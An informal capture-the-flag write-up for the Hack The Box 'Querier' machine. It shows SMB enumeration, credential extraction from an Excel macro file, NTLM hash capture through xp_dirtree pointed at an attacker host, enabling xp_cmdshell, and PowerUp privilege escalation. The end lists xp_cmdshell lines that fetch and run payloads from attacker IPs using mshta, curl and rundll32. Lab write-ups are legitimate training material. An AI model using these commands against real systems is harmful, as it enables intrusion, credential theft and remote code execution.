core technology on this one is Microsoft SQL Server defintely enjoyed this one..

Blogs soon to come and pictures to follow as well for now just text :(

First I started like any other box in the hacker community you probe my friend you
probe until it hurts lol. So below we can see some interesting ports open and you
right from the jump have that hmmm.

Using smbclient -L //10.10.10.125 lets check access to the box and if we 
can find anything good. So I did I found right away on //10.10.10.125/Reports 
need to extract something maybe..lets see lol

In reports we find -

Currency Volume Report.xlsm

We then begin to dig and see its encrypted so using
strings "Currency Volume Report.xlsm"

I find this looking thru the file you must use excel to pull out the contents
of the xlsm extentsion...

SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;
Pwd=PcwTWTH*******

Got it logging into using DBeaver using netntlmv2 setting
finally was able to probe around the box using commands
for MSSQL which below are some examples of me probing the box with differnt commands 

I realized a key technique which hackers its a must know if you wanna crack some boxes
in both real life and in CTF challenges so learn some xp_cmdshell commands and others you will see
being used to accomplish the goal of privlage escalation sometimes there is more to the story that this. 

EXEC volume.sys.xp_dirtree "C:\",1,1; - prints out directories can probe box with this to see
what is going on..

Next after playing with some commands and you may use different methods but here is how I nailed 
the box. Next after making decisions on my next move I fired up responder and shout out to Ch3f 
who loves that tool lmfao...

For user ==================================================================================================

Use whatever settings you have for ip and adapter typically in HTB is tun0

EXEC Master.dbo.xp_DirTree"\\10.10.14.250:1234\x",1,1; - use with responder to capture hash

:corp****** got it! :)

At first not going to lie I logged right back into sql and was trying from there at first thinking
that was the way to priv esc and what I found was that after running some more mssql commands.

I then used playing around these commands to see if I can get user this way or load files on the box -

sp_configure 'show advanced option'

EXEC sp_configure 'show advanced option', '1';  
RECONFIGURE WITH OVERRIDE;

sp_configure 'xp_cmdshell', '1';

----------------------------------------------------------------------------------------------------------

After more probing around I found a decent working exploit on github for a mssql shell to upload files 
effective as thru mssql console or DBeaver it was rather difficult. 

was able to get user after logging into db as the mssql-svc user and use the elevating commands above
to enable file access thru cmdshell. 

xp_cmdshell 'more C:\Users\mssql-svc\Desktop\User.txt'

Then got user :)

output                          |
--------------------------------|
c37b41bb669da34*****************|
                                |

After finally getting the new exploit shell found for mssql-svc user I was able to move around the box
pretty well and like any other windows box the first things I could think of was some powershell scripts
like PowerUP to get that admin user and root.


+++++============root and priv esc====================================================

First I got PowerUp on the box and then began the music of probing the box
and right away a found config file printed out at the end

Shout out to Alamot for the exploit for mssql-svc as this gave me stability to upload files and execute
them. Just google that name and github to find it..

then logged into smb for quickness

smbclient -U administrator //10.10.10.125/C$ 

place in password then used get root.txt from Desktop -

cat root.txt

Some example commands for cmdshell I tried but did not work here but good to know...
----------------------------------------------------------------------------------------------------------
[examples or stuff that may work elsewhere lol...]

xp_cmdshell 'mshta.exe http://10.10.14.159:8080/4HxsxHJDuRZIsV.hta' didnt work :(
xp_cmdshell 'curl http://10.10.14.250/443.exe'
xp_cmdshell 'curl http://10.10.14.181:8080/0iHu91Ev' - example curl is enabled

xp_cmdshell 'rundll32.exe \\10.10.14.159\EeAcNH\test.dll,0'
